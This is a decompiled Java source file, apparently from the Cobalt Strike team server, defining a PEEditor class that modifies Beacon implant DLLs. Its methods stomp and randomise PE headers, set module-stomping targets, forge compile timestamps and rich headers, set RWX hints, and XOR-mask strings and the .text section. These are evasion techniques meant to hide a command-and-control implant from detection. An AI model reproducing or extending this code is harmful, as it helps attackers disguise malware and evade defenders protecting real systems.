package pe;

import aggressor.TeamServerProps;
import common.CommonUtils;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;
import java.util.Iterator;

public class PEEditor {
   protected PEParser info = null;
   protected byte[] data;
   protected byte[] bdata = new byte[8];
   protected ByteBuffer buffer = null;
   protected int origch = 0;
   private boolean A = false;

   public byte[] getImage() {
      return this.data;
   }

   public void checkAssertions() {
      this.getInfo();
      short var1 = -8483;
      if ((this.origch & var1) != 0) {
         String var10000 = Integer.toBinaryString(var1);
         CommonUtils.print_error("Beacon DLL has a Characteristic that's unexpected\n\tFlags: " + var10000 + "\n\tOrigc: " + Integer.toBinaryString(this.origch));
      }

   }

   public boolean patchCode(byte[] var1, byte[] var2) {
      String var3 = "Patching Code in .text section: FindMeSize=" + var1.length + " FindMe:" + CommonUtils.toHexString(var1) + " ReplaceMeSize=" + var2.length + " ReplaceMe:" + CommonUtils.toHexString(var2);
      this.A(var3);
      int var4 = this.getInfo().get(".text.PointerToRawData");
      int var5 = var4 + this.getInfo().get(".text.SizeOfRawData");
      this.A("Patching Code: Searching for code starting at " + var4 + " ending at " + var5);
      int var6 = CommonUtils.indexOf(this.data, var1, var4, var5);
      if (var6 == -1) {
         this.A("Patching Code: Code to replace was not found.");
         return false;
      } else {
         for(int var7 = 0; var7 < var2.length; ++var7) {
            this.data[var6 + var7] = var2[var7];
         }

         this.A("Patched Code: Index=" + var6);
         return true;
      }
   }

   public PEParser getInfo() {
      if (this.info == null) {
         this.info = PEParser.load(this.data);
         this.origch = this.getInfo().get("Characteristics");
      }

      return this.info;
   }

   public PEEditor(byte[] var1) {
      this.data = var1;
      this.buffer = ByteBuffer.wrap(this.bdata);
      this.buffer.order(ByteOrder.LITTLE_ENDIAN);
   }

   public void updateChecksum() {
      this.A("Updating Checksum:");
      long var1 = this.getInfo().checksum();
      this.setChecksum(var1);
      this.A("Updated Checksum: " + var1);
   }

   public void setModuleStomp(String var1) {
      this.A("Setting Module Stomp: Lib=" + var1);
      this.setCharacteristic(16384, true);
      this.setString(64, CommonUtils.randomData(64));
      this.setStringZ(64, var1);
      this.A("Set Module Stomp:");
   }

   public void stompPE() {
      this.A("Stomping PE:");
      this.setCharacteristic(1, true);
      this.A("Stomped PE:");
   }

   public void insertRichHeader(byte[] var1) {
      this.A("Inserting Rich Header: (size=" + var1.length + ") RichHeader: " + CommonUtils.toHex(var1));
      this.removeRichHeader();
      if (var1.length != 0) {
         if (var1.length % 4 != 0) {
            CommonUtils.print_opsec("[OPSEC] Rich Header length (" + var1.length + ") is not 4-byte aligned.");
         }

         long var2 = (long)this.getInfo().get("e_lfanew");
         this.setValueAt("e_lfanew", var2 + (long)var1.length);
         byte[] var4 = Arrays.copyOfRange(this.data, 0, 128);
         byte[] var5 = Arrays.copyOfRange(this.data, (int)var2, 1024 - var1.length);
         byte[] var6 = CommonUtils.join(var4, var1, var5);
         System.arraycopy(var6, 0, this.data, 0, 1024);
         this.info = PEParser.load(this.data);
         this.A("Inserted Rich Header:");
      }

   }

   public void removeRichHeader() {
      this.A("Removing Rich Header:");
      if (this.getInfo().getRichHeaderSize() != 0) {
         long var1 = (long)this.getInfo().get("e_lfanew");
         this.setValueAt("e_lfanew", 128L);
         byte[] var3 = Arrays.copyOfRange(this.data, 0, 128);
         byte[] var4 = Arrays.copyOfRange(this.data, (int)var1, 1024);
         byte[] var5 = new byte[1024 - (var3.length + var4.length)];
         byte[] var6 = CommonUtils.join(var3, var4, var5);
         System.arraycopy(var6, 0, this.data, 0, 1024);
         this.info = PEParser.load(this.data);
         this.A("Removed Rich Header:");
      }

   }

   public void setExportName(String var1) {
      this.A("Setting Export Name: Value=" + var1);
      if (!var1.equals(this.getInfo().getString("Export.Name"))) {
         int var2 = CommonUtils.bString(this.data).indexOf(var1 + "\u0000");
         if (var2 > 0) {
            int var3 = this.getInfo().getLocation("Export.Name");
            int var4 = this.getInfo().getPointerForLocation(0, var2);
            this.setLong(var3, (long)var4);
         } else {
            CommonUtils.print_warn("setExportName() failed. " + var1 + " not found in strings table");
         }

         this.A("Set Export Name:");
      }

   }

   public void setChecksum(long var1) {
      this.A("Setting Checksum [long]: Checksum=" + var1);
      this.setLong(this.getInfo().getLocation("CheckSum"), var1);
      this.A("Set Checksum [long]:");
   }

   public void setAddressOfEntryPoint(long var1) {
      this.A("Setting Address Of Entry Point: Value=" + var1);
      this.setValueAt("AddressOfEntryPoint", var1);
      this.A("Set Address Of Entry Point:");
   }

   public void setEntryPoint(long var1) {
      this.A("Setting/Fixing Entry Point: Value=" + var1);
      long var3 = (long)this.getInfo().get("AddressOfEntryPoint");
      this.setValueAt("LoaderFlags", var3);
      this.setCharacteristic(4096, true);
      this.setAddressOfEntryPoint(var1);
      this.A("Set/Fixed Entry Point:");
   }

   public void setString(int var1, byte[] var2) {
      this.A("Setting String [byte array]: Offset=" + var1 + " Length=" + var2.length + " Value=" + CommonUtils.toHexString(var2));

      for(int var3 = 0; var3 < var2.length; ++var3) {
         this.data[var3 + var1] = var2[var3];
      }

      this.A("Set String [byte array]:");
   }

   public void setStringZ(int var1, String var2) {
      this.A("Setting String [zero terminated]: Offset=" + var1 + " Value=" + var2);

      for(int var3 = 0; var3 < var2.length(); ++var3) {
         this.data[var3 + var1] = (byte)var2.charAt(var3);
      }

      this.data[var1 + var2.length()] = 0;
      this.A("Set String [zero terminated]:");
   }

   public int getInt(int var1) {
      CommonUtils.clearBuffer(this.buffer);

      for(int var2 = 0; var2 < 4; ++var2) {
         this.buffer.put(var2, this.data[var2 + var1]);
      }

      return (int)this.getInfo().fixAddress((long)this.buffer.getInt());
   }

   public void setLong(int var1, long var2) {
      this.A("Setting Long Value: Offset=" + var1 + " Value=" + var2);
      CommonUtils.clearBuffer(this.buffer);
      this.buffer.putLong(0, var2);

      for(int var4 = 0; var4 < 4; ++var4) {
         this.data[var4 + var1] = this.bdata[var4];
      }

      this.A("Set Long Value:");
   }

   public void setShort(int var1, long var2) {
      this.A("Setting Short Value: Offset=" + var1 + " Value=" + var2 + " CastShort=" + (short)((int)var2));
      CommonUtils.clearBuffer(this.buffer);
      this.buffer.putShort(0, (short)((int)var2));

      for(int var4 = 0; var4 < 2; ++var4) {
         this.data[var4 + var1] = this.bdata[var4];
      }

      this.A("Set Short Value:");
   }

   public void setCharacteristic(int var1, boolean var2) {
      this.A("Setting Characteristic: Key=" + var1 + " Enable=" + var2);
      int var3 = this.getInfo().getLocation("Characteristics");
      if (var2) {
         this.origch |= var1;
      } else {
         this.origch &= ~var1;
      }

      this.setShort(var3, (long)this.origch);
      this.A("Setting Characteristic: Offset=" + var3);
   }

   public void setSectionCharacteristics(String var1, long var2) {
      this.A("Setting Section Characteristics: Section=" + var1 + " Value=" + var2);
      int var4 = this.getInfo().getLocation(var1 + ".Characteristics");
      this.setLong(var4, var2);
      this.A("Set Section Characteristics: Offset=" + var4);
   }

   public void setCompileTime(String var1) {
      this.A("Setting Compile Time [string]: Date=" + var1);
      this.setCompileTime(CommonUtils.parseDate(var1, "dd MMM yyyy HH:mm:ss"));
      this.A("Set Compile Time [string]");
   }

   public void setCompileTime(long var1) {
      this.A("Setting Compile Time [long]: Date=" + var1);
      int var3 = this.getInfo().getLocation("TimeDateStamp");
      this.setLong(var3, var1 / 1000L);
      this.A("Set Compile Time [long]: Offset=" + var3);
   }

   public void setValueAt(String var1, long var2) {
      this.A("Setting Long Value At: LocationName=" + var1 + " Value=" + var2);
      int var4 = this.getInfo().getLocation(var1);
      this.setLong(var4, var2);
      this.A("Set Long Value At: offset=" + var4);
   }

   public void setImageSize(long var1) {
      this.A("Setting Image Size: size=" + var1);
      int var3 = this.getInfo().getLocation("SizeOfImage");
      this.setLong(var3, var1);
   }

   public void setRWXHint(boolean var1) {
      this.A("Setting RWX Hint: Value=" + var1);
      this.setCharacteristic(32768, var1);
   }

   public void stomp(int var1) {
      this.A("Stomping: location=" + var1);
      int var2 = 0;

      for(StringBuffer var3 = new StringBuffer(); this.data[var1] != 0; ++var2) {
         var3.append((char)this.data[var1]);
         this.data[var1] = 0;
         ++var1;
      }

      this.data[var1] = 0;
      this.A("Stomped: length=" + var2);
   }

   public void mask(int var1, int var2, byte var3) {
      byte[] var10000 = new byte[]{var3};
      this.A("Masking Memory: start=" + var1 + " length=" + var2);

      for(int var5 = var1; var5 < var1 + var2; ++var5) {
         byte[] var10000 = this.data;
         var10000[var5] ^= var3;
      }

   }

   public void maskString(int var1, byte var2) {
      byte[] var10000 = new byte[]{var2};
      this.A("Masking String: location=" + var1);

      byte[] var10000;
      StringBuffer var4;
      for(var4 = new StringBuffer(); this.data[var1] != 0; ++var1) {
         var4.append((char)this.data[var1]);
         var10000 = this.data;
         var10000[var1] ^= var2;
      }

      var10000 = this.data;
      var10000[var1] ^= var2;
      if (var4.toString().length() >= 63) {
         CommonUtils.print_error("String '" + var4.toString() + "' is >=63 characters! Obfuscate WILL crash");
      }

      this.A("Masked String: Length=" + var4.toString().length());
   }

   public void obfuscate(boolean var1) {
      this.A("Obfuscating: DoIt: " + var1);
      if (var1) {
         this._obfuscate();
         this.obfuscatePEHeader();
      } else {
         this.setLong(this.getInfo().getLocation("NumberOfSymbols"), 0L);
      }

      this.A("Obfuscating Finished");
   }

   public void obfuscatePEHeader() {
      this.A("Obfuscating PE Header");
      int var1 = this.getInfo().get("e_lfanew");
      byte[] var2 = CommonUtils.randomData(var1 - 64);
      this.setString(64, var2);
      var1 = this.getInfo().get("SizeOfHeaders") - this.getInfo().getLocation("HeaderSlack");
      var2 = CommonUtils.randomData(var1 - 4);
      this.setString(this.getInfo().getLocation("HeaderSlack"), var2);
      this.A("Obfuscating PE Header Finished");
   }

   public void maskSection(String var1, byte var2) {
      byte[] var10000 = new byte[]{var2};
      String var4 = "Masking Section: name=" + var1;
      this.A(var4);
      if (!this.getInfo().hasSection(var1)) {
         CommonUtils.print_stat("Will not mask '" + var1 + "'");
      } else {
         int var5 = this.getInfo().get(var1 + ".PointerToRawData");
         int var6 = this.getInfo().get(var1 + ".SizeOfRawData");
         this.A("Masking Section: start=" + var5 + " size=" + var6);
         this.mask(var5, var6, var2);
      }

   }

   protected void _obfuscate() {
      this.A("_Obfuscating");
      byte var1 = -61;
      this.setLong(this.getInfo().getLocation("NumberOfSymbols"), (long)var1);
      Iterator var2 = this.getInfo().stringIterator();

      while(var2.hasNext()) {
         int var3 = (Integer)var2.next();
         this.maskString(var3, var1);
      }

      this.maskSection(".text", var1);
      this.A("_Obfuscation Finished");
   }

   public static void main(String[] var0) {
      byte[] var1 = CommonUtils.readFile(var0[0]);
      PEEditor var2 = new PEEditor(var1);
      if ("true".equalsIgnoreCase(TeamServerProps.getPropsFile().getString("logging.PEEditor_main", "false"))) {
         var2.setLogActions(true);
      }

      var2.setCompileTime(System.currentTimeMillis() + 3600000L);
      var2.setImageSize(512000L);
      var2.setRWXHint(true);
      var2.obfuscate(false);
      PEParser var3 = PEParser.load(var2.getImage());
      System.out.println(var3.toString());
   }

   public boolean isLogActions() {
      return this.A;
   }

   public void setLogActions(boolean var1) {
      this.A = var1;
      this.A("Log Actions Set: " + var1);
   }

   private void A(String var1) {
      if (this.A) {
         CommonUtils.print_info("PEEditor: " + var1);
      }

   }
}
